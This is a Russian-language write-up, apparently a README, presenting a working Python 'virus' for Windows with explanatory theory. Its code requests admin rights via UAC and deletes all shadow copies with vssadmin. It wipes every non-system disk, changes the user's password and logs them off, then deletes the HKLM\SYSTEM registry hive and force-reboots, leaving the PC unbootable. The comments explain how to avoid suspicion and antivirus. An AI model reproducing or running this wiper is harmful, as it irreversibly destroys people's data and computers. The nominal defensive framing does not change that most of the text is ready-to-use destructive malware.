## <a name="theorem"></a> 2) 📚 Теоретическая часть
В этом разделе разобраны концепции, на которых базируется работа скрипта. Понимание этих механизмов необходимо для осознанного построения защиты.
### 1. Доверие к администратору (UAC Token)
В архитектуре Windows права администратора являются «абсолютными».
Теория: Когда пользователь подтверждает запрос UAC (User Account Control), процесс получает токен, который позволяет ему взаимодействовать с критическими системными утилитами (diskpart, vssadmin, reg).
Проблема: Система безопасности Windows спроектирована так, что она доверяет действиям администратора. Если админ приказал удалить диск — система считает это легитимным действием.
### 2. Уровни владения данными (TrustedInstaller vs Admin)
Многие ошибочно думают, что администратор может всё. На самом деле:
Файлы в System32 защищены владельцем TrustedInstaller.
Но: Реестр (ветка SYSTEM) и таблица разделов диска защищены слабее. Администратор имеет достаточно прав, чтобы «отпилить сук, на котором сидит система», не затрагивая защищенные файлы напрямую.
### 3. Механизм блокировки файлов (File Locking)
Windows запрещает удалять файлы, которые запущены в данный момент.
Обход: Скрипт не пытается удалить запущенные файлы. Вместо этого он уничтожает структуру, которая ими управляет (реестр и таблицу разделов). Это позволяет «убить» систему, пока она еще работает, так как критические данные уже загружены в оперативную память.
### 4. Особенности накопителей (HDD vs SSD TRIM)
Критическое различие в физике хранения данных:
HDD: Команда clean стирает только заголовки. Данные остаются на пластинах физически.
SSD: После удаления раздела система может отправить команду TRIM. Это заставляет контроллер SSD физически очистить ячейки памяти в фоновом режиме. Это делает восстановление невозможным даже с помощью профессионального ПО.
## <a name="virus"></a> 3) 💻 Струкура вируса
Весь процесс разделен на логические блоки. Каждый блок использует определенную уязвимость в логике работы ОС.

### 1. Эскалация прав (UAC Request)
Чтобы скрипт мог управлять дисками и реестром, ему нужны права администратора. Мы используем библиотеку ctypes для вызова системного окна подтверждения.
###### python
    # импорт нужных библиотек
    import os, ctypes, sys, subprocess, time
###### python
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
###### python
    def main_script():
        # 1. Запрос прав администратора
        # Это главная преграда: если юзер нажмет "Нет", атака захлебнется.
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()
Используйте код с осторожностью.

Почему это работает: Большинство пользователей привыкли нажимать «Да» при установке софта. Как только кнопка нажата, скрипт получает полный контроль над системными API.

### 2. Сжигание мостов (VSS & Backups)
Прежде чем начать удаление, скрипт лишает систему возможности автоматического восстановления.
###### python
        try:
            # --- ЭТАП 1: СКРЫТАЯ ПОДГОТОВКА ---
        
            # Удаление точек восстановления (VSS)
            # Делаем это первым, пока юзер не видит подвоха.
            subprocess.run("vssadmin delete shadows /all /quiet", shell=True)
Эффект: Команда vssadmin — штатный инструмент. Её запуск не вызывает подозрений у антивирусов, но она мгновенно уничтожает все точки восстановления.

### 3. Очистка несистемных дисков (D:, E:, ...)
Для работы с дисками используется PowerShell. Это быстрее и надежнее, чем классический diskpart, так как позволяет использовать пайплайны (фильтры).
###### python
        # Очистка всех дополнительных дисков (D:, E: и т.д.)
        # Используем PowerShell для мгновенного Clear-Disk для всех дисков, кроме системного (Number -ne 0).
        ps_wipe_extra = 'Get-Disk | Where-Object {$_.Number -ne 0} | Clear-Disk -RemoveData -Confirm:$false'
        subprocess.run(["powershell", "-Command", ps_wipe_extra], shell=True)
Результат: Диск C: продолжает работать (система жива), но все остальные накопители мгновенно становятся «неразмеченным пространством». Данные пользователя пропадают из проводника. Тут большую роль сыграет TRIM, но о нем я расскажу позже

Используйте код с осторожностью.

### 4. Блокировка и Logoff
Чтобы пользователь не успел помешать процессу, мы меняем пароль и выбрасываем его на экран входа.
###### python
        # --- ЭТАП 2: БЛОКИРОВКА И ВЫХОД ИЗ ПОЛЬЗОТЕЛЯ ---

        # Смена пароля текущего пользователя
        user = os.getlogin()
        new_pass = "Critical_Error_0x000FF" # Сложный пароль, который юзер не угадает
        subprocess.run(f"net user {user} {new_pass}", shell=True)
###### python
        # Мгновенный выход из системы (Logoff)
        # Пользователь оказывается на экране входа. Его пароль больше не подходит.
        # Это дает скрипту еще 1-2 секунды завершить реестр до падения системы.
        subprocess.run("logoff", shell=True)
        time.sleep(2)
Игра на время: Юзер видит экран блокировки, пытается войти, пароль не подходит. В эти секунды в фоне выполняется самый разрушительный этап.

### 5. Финальный удар по реестру (Registry Sabotage)
Последнее действие — удаление ветки SYSTEM. Это «мозги» Windows, где хранятся инструкции по загрузке драйверов.
###### python
        # --- ЭТАП 3: ФИНАЛЬНЫЙ УДАР ---

        # Уничтожение реестра (ветка SYSTEM)
        # Удаляем "мозги" Windows. Теперь она не знает, как загрузиться.
        subprocess.run("reg delete HKLM\\SYSTEM /f", shell=True)
###### python
        # Принудительная перезагрузка без задержки
        os.system("shutdown /r /f /t 0")
Возможно, если антивирусы нам не помешают удалить все, а системе еще долго не понадобится реестр, то ОС не улетит сразу в BSOD. Если улетел в BSOD, то скорее всего ПК уже умер. Если не улетел(а он может жить без этого до 10 минут), то скрипт, закончив с реестром, перезагрузит ПК. Дальше пользователь будет видеть BSOD всегда - ПК умер

Точка невозврата: После перезагрузки ядро системы не сможет инициализироваться. Компьютер уйдет в бесконечный цикл BSOD или покажет ошибку отсутствия диска.
